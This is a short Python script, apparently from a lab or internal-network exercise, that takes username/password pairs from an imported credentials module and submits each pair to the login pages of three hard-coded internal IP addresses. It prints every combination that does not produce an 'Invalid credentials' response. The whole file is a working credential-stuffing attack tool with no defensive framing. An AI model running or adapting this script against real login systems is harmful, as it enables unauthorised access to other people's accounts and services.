import requests
from credentials import creds


#possible creds


#url='http://YOUR_INTERNAL_IP:PORT/login'
urls=['http://10.138.0.36:80/login', 'http://10.138.0.38:81/login','http://10.138.0.37:82/login']

for url in urls:
	for u in creds:
		#two name attributes of input elements
		payload={'username':u,'password':creds[u]}
		post=requests.Session().post(url, data=payload)
		if 'Invalid credentials' not in  post.text:
			#print valid username and password
			print(u+' '+creds[u]+' ' + url )

